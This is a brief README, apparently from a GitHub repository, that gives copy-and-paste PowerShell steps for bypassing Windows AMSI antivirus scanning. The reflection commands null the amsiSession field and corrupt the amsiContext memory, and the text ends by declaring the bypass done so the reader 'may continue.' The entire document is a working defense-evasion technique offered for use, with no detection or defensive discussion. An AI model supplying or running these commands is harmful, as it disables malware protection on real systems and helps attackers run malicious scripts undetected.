# AMSI Bypass steps (example)

## Github repo: https://github.com/Sh3lldon/FullBypass

### First execute

 - $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

### And after

 - [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);

 - [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)

### It should show something like this

 - This script contains malicious content and has been blocked by your antivirus software.

### Then you have to use AMSI bypass. Copy and paste line by line.

 - $a = [Ref].Assembly.GetTypes() | ?{$_.Name -like '*siUtils'}

 - $b = $a.GetFields('NonPublic,Static') | ?{$_.Name -like '*siContext'}

 - [IntPtr]$c = $b.GetValue($null)

 - [Int32[]]$d = @(0xff)
 
 - [System.Runtime.InteropServices.Marshal]::Copy($d, 0, $c, 1)

### After repeat

 - $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

### And after

 - [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);
 -  - [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)

### And you should not see errors about "antivirus software". At this point you bypassed AMSI. And may continue.
